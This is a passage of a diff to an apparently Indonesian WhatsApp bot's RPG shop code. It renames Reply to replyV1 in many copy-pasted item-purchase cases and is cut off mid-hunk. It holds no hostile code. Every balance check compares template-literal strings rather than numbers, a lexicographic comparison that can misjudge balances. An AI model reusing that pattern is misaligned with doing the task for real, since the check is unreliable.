@@ -21189,14 +21162,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'domba': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 2000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].domba += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Domba: ${args[1]}
@@ -21210,14 +21183,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'ikan': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 200)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].ikan += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Ikan: ${args[1]}
@@ -21231,14 +21204,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'rumah': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 2000000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].rumah += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • rumah: ${args[1]}
@@ -21252,14 +21225,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'emerald': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 20000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].emerald += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Emerald: ${args[1]}
@@ -21273,14 +21246,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'diamond': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 50000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].diamond += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Diamond: ${args[1]}
@@ -21294,14 +21267,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'botol': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 200)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].botol += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Botol: ${args[1]}
@@ -21315,14 +21288,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'kardus': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 200)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].kardus += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Kardus: ${args[1]}
@@ -21336,14 +21309,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'kaleng': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 200)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].kaleng += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Kaleng: ${args[1]}
@@ -21357,14 +21330,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'gelas': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 200)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].gelas += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Gelas: ${args[1]}
@@ -21378,14 +21351,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'plastik': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 200)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].plastik += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Plastik: ${args[1]}
@@ -21399,14 +21372,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'banteng': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 30000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].banteng += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Banteng: ${args[1]}
@@ -21420,14 +21393,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'gajah': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 70000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].gajah += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Gajah: ${args[1]}
@@ -21441,14 +21414,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'harimau': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 100000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].harimau += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Harimau: ${args[1]}
@@ -21462,14 +21435,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'kambing': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 30000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].kambing += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Kambing: ${args[1]}
@@ -21483,14 +21456,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'panda': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 40000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].panda += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Panda: ${args[1]}
@@ -21504,14 +21477,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'buaya': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 20000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].buaya += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Buaya: ${args[1]}
@@ -21525,14 +21498,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'kerbau': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 40000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].kerbau += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Kerbau: ${args[1]}
@@ -21546,14 +21519,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'monyet': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 20000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].monyet += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Monyet: ${args[1]}
@@ -21567,14 +21540,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'babihutan': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 20000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].babihutan += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Babi Hutan: ${args[1]}
@@ -21588,14 +21561,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'babi': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 20000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].babi += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Babi: ${args[1]}
@@ -21609,14 +21582,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'limit': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 10000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         db.users[m.sender].limit += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Limit: ${args[1]}
@@ -21631,14 +21604,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       case 'glimit':
       case 'gamelimit': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 10000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         db.users[m.sender].glimit += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Game Limit: ${args[1]}
@@ -21652,14 +21625,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'paus': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 78000500)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].paus += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Paus: ${args[1]}
@@ -21673,14 +21646,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'kepiting': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 2000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].kepiting += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Kepiting: ${args[1]}
@@ -21694,14 +21667,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'gurita': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
+        if (isNaN(args[1])) return replyV1(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
         let uang = Number(parseInt(args[1]) * 3000)
         let jumlh = Number(args[1])
-        if (`${db.users[m.sender].saldo}` < `${uang}`) return Reply(`*Saldo Kamu Tidak Cukup*`)
+        if (`${db.users[m.sender].saldo}` < `${uang}`) return replyV1(`*Saldo Kamu Tidak Cukup*`)
         db.users[m.sender].saldo -= uang
         global.db.erpg[m.sender].gurita += parseInt(args[1])
-        Reply(`*MARKET - BELI🛍️*
+        replyV1(`*MARKET - BELI🛍️*
 
 *Item Dibeli:*
   ${vircion} • Gurita: ${args[1]}
@@ -21715,14 +21688,14 @@ if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]
       break
       case 'cumi': {
 
-if (!args[1]) return Reply(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
-        if (isNaN(args[1])) return Reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${command} ${args[0]} 2`)
+if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[0]} 2`)
